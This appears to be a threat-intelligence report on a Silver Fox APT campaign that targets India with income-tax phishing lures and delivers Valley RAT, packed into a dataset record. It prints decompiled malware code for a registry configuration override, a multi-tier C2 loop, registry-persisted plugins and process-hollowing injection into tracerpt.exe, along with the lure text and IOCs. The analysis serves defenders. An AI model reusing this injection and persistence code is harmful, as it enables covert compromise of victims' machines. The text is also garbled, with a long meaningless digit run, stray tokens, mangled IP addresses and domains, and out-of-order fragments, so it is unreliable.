\n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "CloseHandle(ProcessInformation.hThread);CloseHandle(ProcessInformation.hProcess);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "fwrite(Buffer_3, 1u, Size, Stream);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C 